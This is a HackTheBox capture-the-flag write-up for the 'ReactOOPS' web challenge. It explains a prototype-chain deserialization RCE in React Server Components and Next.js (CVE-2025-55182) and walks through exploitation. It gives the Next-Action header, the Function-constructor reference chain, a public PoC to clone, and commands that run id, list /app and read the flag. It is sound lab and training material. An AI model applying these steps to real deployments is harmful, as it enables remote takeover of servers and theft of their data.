
# #HTB 


![[Pasted image 20260928012013.png]]


# HTB ReactOOPS Writeup

**Category:** Web  
**Difficulty:** Very Easy  
**Platform:** HackTheBox

---

## Challenge Description

ReactOOPS is a very easy web challenge that requires identifying a vulnerable Next.js and React Server Components deployment, sending a crafted Next-Action multipart request, abusing React model resolution to execute server-side JavaScript, and exfiltrating the flag from the application container.

The target is a public NexusAI landing page built with Next.js and React. Although the visible page is static marketing content, the deployed framework stack exposes a server action handling path that can be reached without authentication.

## Skills Required
- Basic HTTP request crafting
- Familiarity with Next.js and React Server Components concepts
- Understanding of multipart form-data requests
- Basic Node.js command execution primitives

## Skills Learned
- Identifying exposed Next.js Server Action handling
- Crafting React Flight model payloads in multipart requests
- Abusing model resolution to reach a JavaScript function constructor
- Executing Node.js child-process commands through a framework-level RCE path
- Exfiltrating server-side files through an outbound HTTP request


---

## Initial Analysis

The release contains a minimal Next.js application. The package metadata shows a Next.js 16 deployment with React 19:
```json
{
  "dependencies": {
    "next": "16.0.6",
    "react": "19",
    "react-dom": "19"
  }
}
```

The page source is a static `app/page.tsx` landing page and does not expose an application-specific form, API route, or authentication workflow. That makes the framework request handling itself the interesting attack surface.



---

## Enumeration

Opening the application shows a polished React SPA with:
- No login
- No upload forms
- No visible API endpoints

However, framework fingerprinting reveals:
- Next.js asset paths (`/_next/`)
- Streaming responses
- Hydration behaviour consistent with React Server Components

The reference solver sends a direct POST request to `/` with two important headers:

```python
headers = {
    "Next-Action": "x",
    "Content-Type": f"multipart/form-data; boundary={boundary}",
}
```

The `Next-Action` header causes the request to be processed as a Server Action request. The body is a crafted multipart payload containing React model references.



---

## Vulnerability Overview

**CVE-2025-55182** (also known as React2Shell) is a critical vulnerability affecting React Server Components and Next.js. The React Server Components "Flight" protocol deserializes attacker-controlled multipart form-data without validating prototype-chain access. By sending a crafted POST request with the `Next-Action: x` header, attackers can reach the `Function` constructor through a reference chain like `$1:__proto__:then` and `$1:constructor:constructor`, resulting in remote code execution on the server[](https://github.com/TheStingR/ReactOOPS-WriteUp#1)

The vulnerable versions are `react-server-dom-{webpack,turbopack,parcel}` 19.0.0–19.2.0 and Next.js 15.x/16.x[](https://github.com/TheStingR/ReactOOPS-WriteUp#1)


---

## Exploitation

### Step 1: Clone the Exploit Framework

Clone a public PoC for CVE-2025-55182:
```bash
git clone https://github.com/freeqaz/react2shell
cd react2shell
chmod +x exploit-redirect.sh
```

![[Pasted image 20260928011618.png]]



---

### Step 2: Verify Remote Code Execution

Test command execution with a simple command:
```bash
./exploit-redirect.sh -q http://<TARGET>:<PORT> "id"
```

![[Pasted image 20260928011632.png]]

Expected output shows `uid=0(root)` — the web server is running as root[](https://github.com/TheStingR/ReactOOPS-WriteUp#1)

**Key Insight:** The output shows `uid=0(root)` - the web server is running as root! This is a security misconfiguration that amplifies the impact.



---

### Step 3: Locate the Flag File

Since the Dockerfile places the flag at `/app/flag.txt`, enumerate the application directory:
```bash
./exploit-redirect.sh -q http://<TARGET>:<PORT> "ls -la /app"
```

![[Pasted image 20260928011645.png]]

**Directory Structure Discovered:**
```text
/app/
├── .next/                    # Next.js build output
├── node_modules/             # Dependencies
├── app/                       # Application source code
├── public/                    # Static assets
├── flag.txt                   # TARGET FILE (mode 600)
├── package.json
└── tsconfig.json
```

**Critical Finding:** Flag file exists at `/app/flag.txt` with restrictive permissions (600).



---

### Step 4: Read the Flag

Use the exploit to read the flag directly:
```bash
./exploit-redirect.sh -q http://<TARGET>:<PORT> "cat /app/flag.txt"
```

![[Pasted image 20260928011710.png]]


---

### Step 5: Solved Lab

![[Pasted image 20260928012100.png]]


---
---

